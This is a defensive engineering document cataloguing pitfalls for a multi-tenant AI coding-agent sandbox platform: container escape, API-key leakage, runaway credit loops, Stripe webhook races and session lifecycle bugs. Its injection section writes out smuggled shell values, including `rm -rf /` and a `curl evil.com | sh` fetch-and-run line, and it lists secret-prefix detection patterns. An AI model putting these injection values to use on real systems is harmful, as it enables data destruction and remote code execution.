# Domain Pitfalls — Agent Playground

**Domain:** Multi-tenant dockerized AI coding-agent runner on a shared Hetzner host
**Researched:** 2026-04-11
**Sources:** MSV `docs/INFRASTRUCTURE.md`, `docs/RELIABLE-AGENT-EXECUTION.md`, `docs/AGENT-HEARTBEAT.md`, `docs/EXECUTOR-CONTRACT.md`; web research on Docker escape, gVisor/Kata, Stripe webhooks, fork bombs, xterm.js.

> **MSV grade for the inheritance of pain:** the existing MSV docs are the single highest-signal artefact for this project. Most "predicted" pitfalls below are not theoretical — they are issues MSV has already paid for in production.

---

## Critical Pitfalls

These cause rewrites, security incidents, or money loss.

### CRIT-1: Generic Claude-Code bootstrap executing arbitrary install scripts as root in a privileged sandbox

**What goes wrong:**
The differentiator of this product is "point at any git repo, the bootstrap container will install + launch the agent." That bootstrap is, by definition, executing untrusted code (`npm install`, `pip install`, arbitrary `setup.sh`, postinstall hooks, build scripts) on behalf of the user. If the bootstrap container runs as root, with the host Docker socket mounted, or with the host filesystem visible, a malicious or even just careless repo can read other tenants' workspaces, exfiltrate BYOK keys from `/proc/<pid>/environ` of sibling containers, or pivot to the host.

**Why it happens:**
- Convenience: easiest way to "let Claude figure it out" is to give the bootstrap container a kitchen-sink image with sudo and Docker CLI.
- Error fatigue: install scripts fail constantly when sandboxed; the temptation is to relax the sandbox until the agent stops complaining.
- Recipe caching: once a "successful" bootstrap is captured, the cached recipe inherits whatever loose permissions the bootstrap had.

**Consequences:**
- Cross-tenant secret leakage (BYOK Anthropic/OpenAI keys are worth real money on the gray market).
- Container escape via [CVE-2025-9074](https://thehackernews.com/2025/08/docker-fixes-cve-2025-9074-critical.html)-class bugs when Docker socket is exposed.
- Crypto miners installed by drive-by repos burning the entire Hetzner CPU budget.
- A single bad recipe poisoning every future bootstrap of that agent (because recipes are cached and reused).

**Prevention:**
1. **Bootstrap path runs in a hardened isolation runtime, not vanilla `runc`.** Default to gVisor (`runsc`) for the bootstrap container; offer Kata Containers / Firecracker for paid tiers. Northflank's 2026 sandbox guide confirms this is the standard pattern: "Default to microVMs for untrusted code, relax to gVisor only when threat model justifies it."
2. **No Docker socket inside the bootstrap container. Ever.** If the bootstrap needs to spawn sub-processes, use a thin RPC to a host-side dispatcher that validates the call.
3. **Read-only root filesystem + tmpfs `/tmp` + dedicated workspace volume.** The only writable mount is `/workspace`, owned by an unprivileged UID.
4. **Drop all Linux capabilities** (`--cap-drop=ALL`), `--security-opt=no-new-privileges`, custom seccomp profile (start from Docker default and remove `mount`, `unshare`, `setns`, `keyctl`, `bpf`, `ptrace`).
5. **Network egress allowlist.** Bootstrap container can reach the model providers, npm/pypi/cargo registries, and the user's git remote — nothing else. No host metadata IP (`169.254.169.254`), no internal Docker network, no other container's gateway port.
6. **User-namespace remapping.** UID 0 in the container = unprivileged UID on host. Even if the user-supplied repo gets root in the container, it cannot touch host files.
7. **Recipe review gate.** A cached recipe is "trusted" only after a human-or-CI approval step; until then it is re-bootstrapped on each session.
8. **Recipe content addressing.** The cached recipe key includes a hash of the repo commit + bootstrap output, so a recipe never silently inherits a different repo's permissions.

**Detection / warning signs:**
- Bootstrap containers with non-empty `/var/run/docker.sock` mount in `docker inspect`.
- `--privileged` flag anywhere in the codebase. Grep for it weekly in CI.
- Any recipe where `RUN` happens as `root` in the final image.
- Egress to unexpected hosts in container netflow logs.
- Bootstrap install times suddenly dropping (cache hit on a poisoned recipe).

**Phase:** **Phase 2 (Container Sandbox Foundations)** — must be solved before the bootstrap path ships. Cannot be retrofitted; the threat model has to be set on day one or every recipe in the catalog inherits the unsafe assumptions.

---

### CRIT-2: BYOK keys leaking into logs, recipe caches, crash dumps, or git history inside containers

**What goes wrong:**
A user pastes an Anthropic key into the UI. The Go API forwards it as an env var to the container. Inside the container, the agent runs `env > debug.log`, or the agent crashes and the supervisor writes a stack trace including environment, or the user does `git commit -a` in their workspace and pushes the env file, or the recipe caches the env into a derived layer.

**Why it happens:**
- Env vars are the path of least resistance for secret injection — and they show up in `/proc/<pid>/environ`, `ps eww`, crash dumps, every coredump.
- Agent debug logs routinely dump full request/response including auth headers.
- AGENTS.md / CLAUDE.md / README.md style files often instruct the agent to "print your config to verify."
- MSV's `INFRASTRUCTURE.md` already documents env-var injection of `GROQ_API_KEY`, `MBALLONA_OAUTH`, `ANTHROPIC_API_KEY` for the picoclaw container (lines 312–339). That pattern transferred unchanged here would leak BYOK.

**Consequences:**
- A leaked Anthropic key with $1000 of credit gets drained in minutes.
- Class-action-grade trust collapse: "the open-source agent platform that leaked everyone's API keys."
- Even worse if the key is the *platform's* central key (used for Claude-Code bootstrap) — a single leak compromises every user.

**Prevention:**
1. **Never inject BYOK as a plain env var.** Use a short-lived broker token: container env contains `PLAYGROUND_PROXY_URL` + `PLAYGROUND_SESSION_TOKEN`; an outbound HTTP proxy on the host injects the real key into upstream provider requests. The container *never* sees the raw key.
2. **For agents that genuinely require the raw key in env** (some SDKs read `ANTHROPIC_API_KEY` directly), inject via `tmpfs`-backed file at `/run/secrets/anthropic_key` and have an entrypoint shim export it into the agent's process only — never the parent shell, never PID 1.
3. **Sanitize logs at the supervisor.** Pipe stdout/stderr through a regex scrubber that masks `sk-ant-…`, `sk-…`, `sk-or-…`, GitHub tokens, etc., before they hit Loki / journald.
4. **`.gitignore` / commit hook in workspace.** The base workspace ships a pre-commit hook that aborts on detected secrets (gitleaks).
5. **Recipe build forbids `ENV` and `ARG` containing secrets.** CI lint on every recipe PR.
6. **Crash dumps disabled.** `ulimit -c 0`, `kernel.core_pattern=|/bin/false` on the host for container PIDs.
7. **Per-session key rotation when possible.** For platform-billed mode, mint a per-session OpenRouter sub-account with a tight credit cap so a leak is bounded.
8. **Audit query: every 24h, scan recipe cache, git push event log, and Loki for known key prefixes.** Alert on hit.

**Detection / warning signs:**
- Any string matching `sk-ant-`, `sk-`, `sk-or-`, `ghp_`, `github_pat_` in the logging pipeline.
- Recipe Dockerfiles with `ENV ANTHROPIC_API_KEY=`.
- User-reported "I see my key in the terminal output."
- Spike in API usage from a key that the user did not initiate.

**Phase:** **Phase 3 (Auth + Secrets)** alongside the BYOK input UI. Build the proxy *before* the BYOK feature is exposed; do not ship BYOK with naive env injection and "fix it later."

---

### CRIT-3: Runaway agent burning model credits in an infinite loop

**What goes wrong:**
A coding agent gets stuck in a loop: it edits a file, fails a test, edits it back, fails the test, … each iteration is a 30k-token model call. In 10 minutes the user has spent $40 (BYOK) or drained their $5 prepaid credit balance to zero (platform-billed) — and *kept calling* because the credit check runs *before* the call but credit deduction runs *after*, with hundreds of in-flight calls.

**Why it happens:**
- Coding agents are particularly prone to thrash loops (Claude Code, OpenClaw, Hermes have all shipped versions with this bug).
- Token cost is reported by the provider *after* the call completes — so the sliding-window check is always behind.
- Naive metering: "check balance > 0 → allow call → deduct after." Concurrent calls all pass the same check before the first deduction lands.
- BYOK users assume "it's my key, I'll cap it on Anthropic's side" — but Anthropic's per-key spend limits are eventually consistent and not reliable for stop-loss.

**Consequences:**
- Platform-billed: oversold credits → user balance goes negative → either we eat the loss or we issue refunds and look incompetent.
- BYOK: user's personal Anthropic bill is $400, blames the platform, churns + posts a screenshot on HN.
- Even worse: the *platform's* fallback key (for bootstrap) gets drained by a malicious user who deliberately triggers a loop in the bootstrap phase.

**Prevention:**
1. **Pre-authorize a token budget before the call, not after.** Estimate max tokens (`max_tokens` parameter) × current model rate, deduct optimistically, refund the unused delta after the response lands.
2. **Hard ceilings independent of credit:** per-session call rate limit (e.g. ≤ 60 model calls / minute), per-session total token cap, per-session wall-clock cap. These are *circuit breakers*, not billing.
3. **Loop detection heuristic:** if the agent has made > N model calls in M seconds with no file diff progress, kill the session and email the user. Pattern matches common thrash signatures (same file edited > K times, same error message > K times).
4. **Per-call idempotency + correlation IDs** so the metering ledger can reconcile against provider invoices nightly.
5. **BYOK has the same circuit breakers as platform-billed.** Even though we're not paying, a runaway BYOK loop drives the user's bill into the ground and they blame us. Treat BYOK as "we are still the steward of this key."
6. **Provider sub-accounts where possible.** OpenRouter supports per-key credit caps. Mint a per-session sub-key with a $5 cap for free tier, $X for paid. When the cap is hit the provider says no and we don't have to.
7. **Atomic metering ledger.** Single `transactions` table, every call writes a row in a serializable transaction, balance is computed as `SUM(amount)` not stored — eliminates the read-modify-write race entirely. (MSV's `poken_balances` table caches the balance and is vulnerable to this; do not copy that pattern.)

**Detection / warning signs:**
- Token usage histogram with a fat tail of sessions > 1M tokens.
- Any session where call count grows linearly with time after the first 5 minutes.
- Reconciliation diff > 1% between platform ledger and provider invoice at end-of-day.

**Phase:** **Phase 5 (Billing + Metering)** must include circuit breakers from day one. Do *not* ship the credit system in Phase 5 and "add the rate limiter in Phase 6."

---

### CRIT-4: Cross-tenant kernel escape on a shared host

**What goes wrong:**
You're running N untrusted users' agents in `runc` containers on one Hetzner box. They share one kernel. Any kernel CVE (`overlayfs`, `io_uring`, `eBPF`, `dirtypipe`, `dirtycow`, …) is a cross-tenant root. [CVE-2025-9074](https://thehackernews.com/2025/08/docker-fixes-cve-2025-9074-critical.html) (CVSS 9.3) showed that even *without* the Docker socket mounted, a malicious container could reach the Docker Engine and spawn additional containers, accessing host files.

**Why it happens:**
- "Docker is isolation" is a myth; Docker is *namespacing*, which is one bug away from broken.
- Single shared kernel is the threat model nobody plans for until it bites.
- Hetzner dedicated box keeps host updates manual; kernel patching lags.

**Consequences:**
- One malicious user reads every other user's workspace → wholesale BYOK leak.
- Crypto miner launched in privileged context → host throttled, all sessions degrade.
- Public CVE disclosure → forced emergency reboot of the entire fleet → all sessions interrupted.

**Prevention:**
1. **gVisor (`runsc`) as the default runtime for untrusted user containers.** It implements ~70% of syscalls in userspace and blocks the rest, dramatically narrowing the kernel attack surface. The performance hit (10–30%) is acceptable for the threat model.
2. **Kata Containers for the Pro tier** — full microVM isolation, hardware-enforced. The Pro user gets a dedicated kernel, not a shared one.
3. **User namespace remapping** on the host (`/etc/docker/daemon.json` → `"userns-remap": "default"`). UID 0 in the container is a non-root UID on the host, even with vanilla runc.
4. **Seccomp + AppArmor** profiles tuned for each agent type. Default Docker seccomp drops ~44 syscalls; tighten further by removing `keyctl`, `bpf`, `ptrace`, `setns`, `unshare` for user containers.
5. **Drop all caps** on user containers, then re-add only the minimal set the agent needs (typically none).
6. **Aggressive host kernel patching.** Subscribe to Ubuntu USNs; auto-apply `linux-image-*` updates with `unattended-upgrades`; tolerate the reboot.
7. **Falco or Tetragon** on the host, alerting on suspicious syscall sequences (`mount`, `setns`, `bpf` invocation from a container). MSV does not have this and should also add it.

**Detection / warning signs:**
- Falco rule fires for `mount` from a container PID.
- Container processes appear in `ps aux` on the host with PID < expected (namespace escape signal).
- Unexpected files appearing under `/opt/playground/data/<other-user>/`.
- Kernel oops in `dmesg` correlated with a session start.

**Phase:** **Phase 2 (Container Sandbox Foundations)**. Choose the runtime up front; switching from `runc` to `runsc` later is technically simple but operationally invasive (every recipe needs re-validation under the new runtime).

---

### CRIT-5: Stripe webhook race conditions double-crediting or losing credits

**What goes wrong:**
Stripe delivers `checkout.session.completed`. Your handler checks "is this session already processed?" — sees `false` — starts crediting. Stripe retries (network blip, timeout), delivers the same event in parallel. Second handler also sees `false`, also credits. User has 2× the credit they paid for. *Or:* handler A creates a `transactions` row but crashes before updating `poken_balances`; handler B sees the transaction exists, skips, user has the receipt but no credits.

This is not theoretical — it's [Pedro Alonso's "Stripe Webhooks: Solving Race Conditions"](https://www.pedroalonso.net/blog/stripe-webhooks-solving-race-conditions/) post almost verbatim, and it happens in shipped code constantly.

**Why it happens:**
- Stripe explicitly delivers webhooks at-least-once and warns handlers must be idempotent.
- Naive idempotency = "check then write" is non-atomic.
- Two independent tables (`transactions`, `balances`) without a single-transaction wrapper.
- MSV's `poken_balances` (cached scalar) + `transactions` schema (INFRASTRUCTURE.md lines 245–264) is exactly this vulnerable pattern.

**Consequences:**
- Money loss (over-crediting) or user-trust loss (under-crediting).
- Replay attacks: adversary captures a webhook payload + signature, replays it; without idempotency they can credit themselves repeatedly.
- Hard to detect — the books look "fine" until you reconcile against Stripe.

**Prevention:**
1. **Atomic idempotency:** put a UNIQUE constraint on `stripe_event_id` in the `webhook_events` table and INSERT it as the first action of the handler — inside the same transaction as the credit update. If the INSERT fails, it's a duplicate; bail.
2. **Single transaction wraps event-record + balance-update.** Either both succeed or both roll back.
3. **Compute balance, don't store it.** `SELECT SUM(amount) FROM transactions WHERE user_id = $1` — balance is a view, not a column. (For performance, materialized view refreshed on insert, or a cached counter that is *only* a hint.)
4. **Verify Stripe signatures on every webhook.** Reject any request without a valid `Stripe-Signature` header — protects against replay from a leaked payload.
5. **Tolerance window:** Stripe signatures include a timestamp; reject events older than 5 minutes to limit replay surface.
6. **Queue webhooks for processing**, don't process them inline. Push to a durable queue (pg-boss is fine, MSV is converging on it per `RELIABLE-AGENT-EXECUTION.md`). Worker pulls one at a time per user_id key — eliminates concurrent processing for the same user.
7. **Reconciliation job nightly:** pull Stripe's event list for the day, verify every event has a corresponding ledger row. Alert on mismatch.

**Detection / warning signs:**
- Any user balance != `SUM(transactions)`.
- More than one row in `webhook_events` for the same `stripe_event_id`.
- Reconciliation diff > 0 against Stripe at end-of-day.
- Customer support tickets containing "I was charged but didn't get credits" / "I have more credits than I paid for."

**Phase:** **Phase 5 (Billing)** — implement idempotency and the ledger schema before the first Stripe call. Retrofitting is painful and error-prone.

---

### CRIT-6: Dangling containers and orphaned state after crashes

**What goes wrong:**
Go API records "session created" in Postgres → crashes before `docker run` returns → restarts → user's UI says "session running" but no container exists. *Or* the inverse: container exists, Postgres row was deleted, container becomes a "ghost" that the lifecycle manager never reaps. Disk slowly fills with orphaned volumes.

MSV documents the pattern in `RELIABLE-AGENT-EXECUTION.md` ("Container OOM — Monthly — High impact" and "Lost workflow state — On restart — High impact"), and the response was pg-boss + s6-overlay + DBOS. Inherit those mitigations on day one.

**Why it happens:**
- Two systems of record (Postgres + Docker daemon) are inherently divergent without a reconciliation loop.
- Crash-during-create races are easy to write, hard to test.
- Idle-cleanup logic that targets "containers older than X" can sweep an active session whose Postgres `last_activity` got stale due to a missed heartbeat.

**Consequences:**
- Persistent disk leak (paid users' "persistent" volume that nobody owns).
- "One active session per user" invariant broken — user has two ghost sessions in DB, can't create a new one.
- User refreshes browser → frontend says "active session," WS connect fails, user is stuck.

**Prevention:**
1. **Postgres is the source of truth; Docker is the cache.** Reconciliation loop runs every 30s: list all `playground-*` containers, list all DB sessions, fix the diff (start missing, kill extra, mark dangling).
2. **Idempotent container names.** `playground-<user_uuid>-<session_uuid>` — recreating with the same name is a no-op or upsert, not a duplicate.
3. **State machine for sessions** with explicit transitions: `pending → starting → running → stopping → stopped → reaped`. Crash recovery walks the table and resumes any session in a transient state (`starting`, `stopping`).
4. **pg-boss / DBOS-style durable workflows** for session create/destroy — survives Go API restarts. (MSV's converged decision per `RELIABLE-AGENT-EXECUTION.md`.)
5. **Idle detection lives inside the container** (heartbeat OUT), not on the host (heartbeat IN). The MSV heartbeat skill at `docs/AGENT-HEARTBEAT.md` is the model — but combine with a host-side liveness probe so a crashed agent also shows offline.
6. **Persistent volume GC is owned by a separate, slower loop.** Volumes are reaped only when the session has been in `reaped` state for > 7 days, never when a session is "missing."
7. **Test the crash:** in CI, kill the Go API mid-`docker run` and assert that the next reconciliation cleans up correctly.

**Detection / warning signs:**
- Reconciliation loop reports diff > 0 sustained.
- `docker ps | wc -l` ≠ `SELECT COUNT(*) FROM sessions WHERE state = 'running'`.
- Disk usage on `/opt/playground/data` growing without new paid users.
- Users reporting "I can't start a session, it says I already have one."

**Phase:** **Phase 4 (Session Lifecycle)**. Build the reconciliation loop *with* the lifecycle manager, not after.

---

## Moderate Pitfalls

### MOD-1: Token counting drift between providers (OpenRouter vs Anthropic vs OpenAI)

**What goes wrong:**
Each provider counts tokens slightly differently. Anthropic prompt-caches differently than OpenAI. OpenRouter passes through provider pricing but adds a small markup (some models). Reasoning tokens (o-series, Sonnet 4.5 thinking, Gemini 2.5 Pro) are reported inconsistently — sometimes hidden, sometimes billed but not surfaced. Anthropic and Gemini have a higher tier above 200K input tokens that some SDKs do not surface in the response.

**Prevention:**
- Trust the *provider's* `usage` field in the response, never your own tokenizer estimate, for billing.
- Store raw provider response next to the metering row for 30 days for dispute resolution.
- Reconcile nightly against provider invoices/exports; alert on > 1% drift.
- Display credit consumption to users with a "± 5%" disclaimer; avoid showing exact-to-the-cent figures pre-reconciliation.
- For OpenRouter, use the `usage` parameter `include: true` to force usage in the response (some OR endpoints omit it by default).
- Treat "200K input tier" pricing as a separate SKU in the rate table.

**Phase:** **Phase 5 (Billing).** Document the rate table format with provider SKUs as first-class.

---

### MOD-2: BYOK vs platform-billed confusion (the wrong key gets metered)

**What goes wrong:**
User toggles their account to BYOK but a platform-billed call still goes through (because the Go API caches the user's billing mode for 5 minutes). Or the inverse: BYOK key is unset / expired, the API silently falls back to the platform key, the user is metered without knowing. Or: BYOK key is rate-limited by Anthropic, the agent retries on the platform key, user is metered for the retry only.

**Prevention:**
- **One mode per session, locked at session start.** The user's "billing mode" is not a runtime flag; it is a property of the session record, immutable for the session's lifetime.
- **No silent fallback.** If the BYOK key is invalid/expired/rate-limited, the call fails loudly and the UI tells the user. Never fall back to the platform key.
- **Different proxy endpoints** for BYOK vs platform — `proxy.playground.local/byok` vs `/platform`. The container only ever sees one URL. The proxy enforces the mode.
- **Metering is keyed on session_id, not user_id.** A platform-billed session writes to `transactions`; a BYOK session writes to a separate `byok_call_log` table (for analytics) but never to `transactions`.
- **UI shows the active mode prominently** in the session header — "Using your Anthropic key" vs "Using $4.32 of credits."

**Phase:** **Phase 5 (Billing).** Address explicitly with end-to-end tests for both modes.

---

### MOD-3: Recipes drifting from upstream agents

**What goes wrong:**
You ship a deterministic recipe for HiClaw v0.5 today. HiClaw v0.6 ships next week, breaks the install command, a user reports "HiClaw doesn't start" — but worse, the cached recipe still works for old users so the regression goes unnoticed for weeks until the next bootstrap.

**Prevention:**
- **Pin agent versions in the recipe** (`hiclaw==0.5.2`, `git checkout v0.5.2`). Never `latest`.
- **Nightly CI that re-runs every recipe** against a clean container, plus tests "hello world" prompt → response. Failure opens an issue automatically.
- **Recipe versioning:** `agents/<name>/v1.yaml`, `agents/<name>/v2.yaml`. New users get the newest version, existing sessions stay on their pinned version.
- **Upstream watch:** poll the agent's GitHub releases page weekly; PR a recipe bump for review.
- **Surface recipe age in the UI** ("This recipe was tested 3 days ago" vs "47 days ago — may be stale").

**Phase:** **Phase 6 (Recipe Catalog)** with CI. Phase 1 should already structure recipes to support pinning + versioning even before the catalog grows.

---

### MOD-4: YAML / shell injection via user-supplied repo URL or recipe field

**What goes wrong:**
User pastes `https://github.com/foo/bar; rm -rf /` as the repo URL. The bootstrap script does `git clone $REPO_URL /workspace` without quoting. Or a recipe field is `name: "; curl evil.com | sh; #"` and gets interpolated into a shell command.

**Prevention:**
- **Never interpolate user input into shell.** Use `exec` form with argv arrays everywhere (`exec.Command("git", "clone", url, dest)`).
- **Validate repo URLs** against an allowlist regex (`^https://(github|gitlab|codeberg|bitbucket)\.com/[\w.-]+/[\w.-]+$`). No `git@`, no `ssh://`, no `file://`, no `javascript:`.
- **Recipes are loaded with a strict YAML loader** (no `!!python/object`, no `!include`). Use `goccy/go-yaml` strict mode or `kubernetes-sigs/yaml`.
- **Recipe schema validation** (JSON Schema) before execution. Fields have allowed character sets.
- **Fuzz the parser** in CI with adversarial YAML.

**Phase:** **Phase 2 (Sandbox)** for shell argv discipline; **Phase 6 (Recipes)** for YAML schema.

---

### MOD-5: Disk filling from persistent volumes + recipe/build caches

**What goes wrong:**
Hetzner box has 40GB SSD (per MSV's actual config — `INFRASTRUCTURE.md` line 20). Each persistent paid session is 1–5GB of node_modules / pip cache / git history. 40 paid users → disk full → all writes fail → cascading container crashes. MSV is currently at 68% disk (line 26).

**Prevention:**
- **Per-volume disk quota** via XFS project quotas or `du`-based supervisor. Reject `npm install` of a 2GB package by failing the write.
- **Tiered storage:** workspace on fast SSD with quota; build caches on a separate larger volume or pruned aggressively.
- **Disk pressure monitoring** with alerts at 70/80/90%. At 90%, refuse new sessions.
- **Cache GC** loop: prune `node_modules` for sessions idle > 7 days (rebuildable from `package-lock.json`).
- **The default Hetzner box is too small.** Specify a larger disk in `HARDWARE.md` for prod (≥ 500GB NVMe). Document the per-user disk budget explicitly.
- **Backup strategy must size for actual disk** — 500GB to backup is meaningfully different from 40GB.

**Phase:** **Phase 7 (Operational hardening)** but the volume layout decision is **Phase 4 (Session Lifecycle)**.

---

### MOD-6: PTY contention and websocket auth bypass on the web terminal

**What goes wrong:**
Two browser tabs open the same session's terminal — both write to the same PTY, output interleaves nonsensically. Or: the websocket upgrade from HTTP only checks the cookie on the initial GET, not on subsequent frames; an attacker who steals the WS URL can connect from a different origin (websockets don't enforce CORS — [xterm.js docs](https://xtermjs.org/docs/guides/security/) and [issue #2443](https://github.com/xtermjs/xterm.js/issues/2443) confirm). Or: keystrokes are logged by browser extensions, exposing pasted secrets.

**Prevention:**
- **Single WS connection per session.** Backend tracks `(session_id) → ws_conn`; new connection kicks the old one with a clean message ("opened in another tab").
- **Auth on WS upgrade is not enough** — also send a per-frame token or use `Sec-WebSocket-Protocol` to carry a session-scoped JWT, and validate origin header against an allowlist. Reject if `Origin` is missing or unknown.
- **Use `wss://` only.** Never plain `ws://`, even on internal networks.
- **Mux chat + terminal over the same WS** (channel field per frame), so the "two views of the same container" share one auth path.
- **Sanitize all PTY output** that gets reflected into HTML elsewhere (e.g. session history view). Direct render to xterm.js is safe; rendering to a div is XSS.
- **Disable bracketed paste echo** for password-typed fields; warn users not to paste secrets in the terminal (the agent should pull from the host-side proxy).
- **Reconnect with backoff + jitter** to prevent reload storms when the server hiccups.

**Phase:** **Phase 4 (Session Lifecycle + UI)** — chat and terminal are the user-facing surface and need this from day one.

---

### MOD-7: Idle timeout killing a session the user is actively watching

**What goes wrong:**
"Idle = no chat message in 30 minutes" reaper kills a session where the user is watching a long-running build in the terminal with no chat input. User loses 30 minutes of work. Or: user has chat open but the WS connection is in a fail-loop, so the heartbeat does not arrive.

**Prevention:**
- **Define "idle" as "no activity from any input surface"** — chat, terminal stdin, file system mtime in workspace, websocket frame received. Take the max of all signals.
- **Surface a countdown in the UI.** "Session will sleep in 4 minutes, click to keep alive."
- **Distinguish sleep from kill.** Free-tier idle = container removed. Paid-tier idle = container stopped (not removed), volume preserved, restarts on next connection in 5–10 seconds.
- **Long-running command awareness:** if `ps` inside the container shows a non-shell process > 60s old (build, test run), treat as active.
- **Grace period after WS disconnect** (e.g. 3 minutes) before counting toward idle, so a Wi-Fi blip doesn't kill the session.

**Phase:** **Phase 4 (Session Lifecycle).**

---

### MOD-8: Persistent volume corruption on crash during write

**What goes wrong:**
Container is mid-write to `/workspace/.git/index` when the host OOM-killer pulls it. Git index is corrupt, agent on next start reports "fatal: bad index file." User's persistent volume is now broken.

**Prevention:**
- **fsync discipline in the container's hot paths** (the agents themselves usually don't fsync; not much you can do client-side).
- **Mount with `sync` or use ext4/xfs with `data=ordered`** so partial writes are bounded.
- **Snapshot before risky operations.** Daily ZFS/btrfs snapshot of `/opt/playground/data` (Hetzner supports this). Hourly snapshots for paid tier.
- **Backup strategy is restorable, not just present.** Test restore quarterly. Document RTO/RPO.
- **OOM kill is detectable** — `dmesg` will say "Killed process X (agent)." Catch via journald and alert; auto-restore latest snapshot for paid tier.

**Phase:** **Phase 7 (Operational hardening).**

---

## Minor Pitfalls

### MIN-1: Agent debug logs filling the host disk

Containers logging at DEBUG by default → 100MB/hr per container. Set Docker `log-opts: max-size=10m, max-file=3` in `daemon.json`. Phase 2.

### MIN-2: Time zone bugs in idle/billing windows

User in UTC+10 thinks "daily allowance" resets at local midnight; the system resets at server UTC. Always store UTC, render in user's TZ, document the policy. Phase 5.

### MIN-3: OAuth token refresh during long sessions

GitHub/Google OAuth tokens expire mid-session; the API silently 401s on next user action. Refresh proactively at 80% of TTL; surface "please re-auth" UX. Phase 3.

### MIN-4: Egress bandwidth blowouts

A user's agent downloads a 5GB model weight from HuggingFace. Hetzner traffic budget exceeded, surcharge applied. Cap egress per session (`tc` rules or app-layer counter), block known large-file CDNs from the bootstrap allowlist. Phase 7.

### MIN-5: Container image bloat slowing cold starts

Base image ships with every language runtime "just in case" → 4GB image, slow cold start, slow bootstrap. Per-agent slim base images (Node-only, Python-only). Phase 2.

### MIN-6: Recipe cache becoming the long pole on session start

After 100 recipes are cached, lookup is O(n) on disk. Index recipes by content hash, store in Postgres, not the filesystem. Phase 6.

### MIN-7: "One active session" invariant broken by create-race

Two browser tabs simultaneously call POST /sessions → both pass the "no existing session" check → two sessions created. UNIQUE constraint on `(user_id) WHERE state IN ('starting','running')` partial index in Postgres. Phase 4.

### MIN-8: Inconsistent unit display in credit balance

Sometimes shown as `$4.32`, sometimes `4.32 USD`, sometimes `432 cents`. Pick one (cents in DB, "$X.YY" in UI), document. Phase 5.

### MIN-9: Stale cached BYOK validity

User rotates their Anthropic key but the platform's "key OK" cache lasts 1 hour. Re-validate on session start; cache TTL ≤ 5 min. Phase 3.

### MIN-10: Refund logic on failed model calls

Provider returns 5xx mid-stream, the partial-token cost is ambiguous. Default policy: if response did not include `usage`, refund optimistically (we eat the cost). Document. Phase 5.

---

## Phase-Specific Warning Map

| Phase | Likely Pitfalls | Mitigation Approach |
|-------|----------------|---------------------|
| **Phase 1 — Foundations / scaffold** | None critical, but any short-cut here echoes through later phases. | Set repo conventions for recipe layout, secret handling, env-var policy *before* Phase 2 ships. |
| **Phase 2 — Container sandbox** | CRIT-1 (untrusted bootstrap), CRIT-4 (kernel escape), MIN-1, MIN-5 | gVisor default runtime, no Docker socket, drop caps, seccomp tight, user-namespace remap, read-only root, network egress allowlist. **This phase is the security spine of the product.** |
| **Phase 3 — Auth + secrets + BYOK input** | CRIT-2 (key leakage), MIN-3, MIN-9 | Outbound proxy injects keys, never raw env-var to container, log scrubber, gitleaks pre-commit in workspace base image. |
| **Phase 4 — Session lifecycle** | CRIT-6 (dangling state), MOD-6 (PTY/WS), MOD-7 (idle false-kill), MIN-7 (create race) | Postgres-as-truth + reconciliation loop, single-WS-per-session, multi-signal idle, partial-index uniqueness, pg-boss for durable lifecycle workflows (inherit MSV pattern). |
| **Phase 5 — Billing / metering / Stripe** | CRIT-3 (runaway agent), CRIT-5 (webhook race), MOD-1 (token drift), MOD-2 (BYOK mode confusion), MIN-2, MIN-8, MIN-10 | Atomic ledger, idempotent webhooks via UNIQUE event_id, pre-authorized token budget, hard circuit breakers, mode locked at session start, nightly reconciliation. |
| **Phase 6 — Recipe catalog + bootstrap** | MOD-3 (drift), MOD-4 (injection), MIN-6 | Pinned versions, nightly recipe CI, strict YAML parser, JSON Schema validation, recipe content addressing. |
| **Phase 7 — Ops + monitoring + backup** | MOD-5 (disk fill), MOD-8 (volume corruption), MIN-4 (egress), CRIT-4 ongoing patching | Per-volume quotas, ZFS/btrfs snapshots, Falco/Tetragon, kernel auto-patching, restore drills, egress caps. |

---

## MSV-Specific Inheritances and "Don't Copy This"

These are patterns directly from `meusecretariovirtual/docs/` that this project must consciously decide to inherit, fix, or avoid.

| MSV Pattern | Source | Inherit? | Notes |
|---|---|---|---|
| Per-user picoclaw container, named `msv-{user}-{id}`, on shared `msv` Docker network | `INFRASTRUCTURE.md` §5, §10 | **Inherit, harden** | Add gVisor runtime, drop default `runc`. Rename namespace to `playground`. |
| Plain env-var injection of `ANTHROPIC_API_KEY`, `GROQ_API_KEY`, `MBALLONA_OAUTH` into container | `INFRASTRUCTURE.md` §10 spawn command | **DO NOT INHERIT** | This is the BYOK leak path. Use proxy. |
| `poken_balances` cached scalar + `transactions` table, two-table balance model | `INFRASTRUCTURE.md` §7 | **DO NOT INHERIT** | Race-prone. Use ledger-only with materialized view. |
| Bind-mount host paths `/opt/msv/data/{telegram_id}` into containers | `INFRASTRUCTURE.md` §10 | **Inherit pattern, fix UID** | With user-namespace remap so host UID is unprivileged. |
| `UFW Status: INACTIVE`, "relies on Hetzner firewall" | `INFRASTRUCTURE.md` §3 | **DO NOT INHERIT** | UFW must be active from day one; Hetzner firewall is layer 4 only and the docs already flag this as a recommended fix. |
| Single `:latest` image tag for picoclaw in production | `INFRASTRUCTURE.md` §5 | **DO NOT INHERIT** | Pinned semver tags only. |
| Gateway crons inside agent for scheduled tasks | `RELIABLE-AGENT-EXECUTION.md` §3 | **DO NOT INHERIT** | Documented as broken. Use pg-boss. |
| pg-boss + s6-overlay + Postgres durable workflow pattern | `RELIABLE-AGENT-EXECUTION.md` §"External Validation" | **INHERIT** | This is the *answer* to most lifecycle reliability issues. Already validated. |
| Heartbeat + checkpoint pattern with stale alerts | `AGENT-HEARTBEAT.md` | **INHERIT, simplify** | Heartbeat yes, IPFS checkpoint via Solvr is MSV-specific and can be deferred to v2. |
| Telegram-as-UI | (entire MSV stack) | **REJECT** | Explicitly out-of-scope per `PROJECT.md`. |
| `msv` system user with `/opt/msv` layout | `INFRASTRUCTURE.md` §2 | **INHERIT** | Mirror as `playground` user, `/opt/playground`. |
| Postgres + Redis on `127.0.0.1`-bound ports | `INFRASTRUCTURE.md` §3 | **INHERIT** | Good, keep doing. |
| `.env` file at `-rw-r----- root:msv` | `INFRASTRUCTURE.md` §2 | **INHERIT** | Good permission discipline. |
| No swap configured | `INFRASTRUCTURE.md` §1 | **DO NOT INHERIT for prod** | Add a small swap (or `zram`) so OOM kills are less abrupt. |
| Disk at 68% on a 40GB box | `INFRASTRUCTURE.md` §1 | **DO NOT INHERIT** | Spec a much larger disk (≥ 500GB NVMe) before paid sessions ship. |
